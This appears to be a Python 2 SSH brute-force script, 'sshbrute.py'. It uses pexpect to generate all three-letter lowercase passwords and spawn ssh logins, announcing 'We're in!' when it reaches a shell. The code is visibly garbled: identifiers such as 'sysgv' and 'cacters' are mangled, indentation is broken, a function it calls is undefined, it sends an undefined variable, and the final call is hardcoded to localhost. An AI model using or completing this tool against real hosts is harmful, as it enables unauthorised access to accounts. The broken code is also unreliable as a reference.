#!/usr/bin/python2

import pexpect, sys

def usage():
    print "./sshbrute.py <-f filename | -g> <host> <username>"
    sys.exit()

def readCmdLine():
    # Read command line and pull out flags
   gLen = len(sysgv)
    ifgLen < 4:
        sys.exit()
    elifgLen == 5 and sysgv[1]=="-f":
        filename = sysgv[2]
        host = sysgv[3]
        user = sysgv[4]
    elifgLen ==4 and sysgv[1]=="-g":
        filename = None
        host = sysgv[3]
        user = sysgv[4]
    else:
        usage()
    return (filename, host, user)


def gen3cPass(cacters):
    passwords = [];
#TODO: Remove duplicate cacters in string before looping all of these
    for c1 in cacters:
        for c2 in cacters:
            for c3 in cacters:
                passwords.append(c1+c2+c3)
    return passwords

def trylogin(host, user, passwordList):
    
    # construct the login string
    connStr = 'ssh ' + user + '@' + host
    
    # use 'spawn' to create the process.
    child = pexpect.spawn(connStr)
    
    ret = child.expect(['password', 'Could not resolve',
                        pexpect.EOF])
    if ret == 1:
        print "Bad hostname"
        sys.exit()
    print "found password prompt"
    
    # send the password
    child.sendline(password)
    
    ret = child.expect('$')
    print "Found command prompt. We're in!"
    
    child.sendline()
    
    child.interact()


(fname, host, user) = readCmdLine()
if fname == None:
    passList = gen3cPass("abcdefghijklmnopqrstuvwxyz")
else:
    #read file of passwords
    passList = readPassFromFile(fname)
trylogin("localhost", "newuser", "qwerty")
#trylogin(host, user, passList)


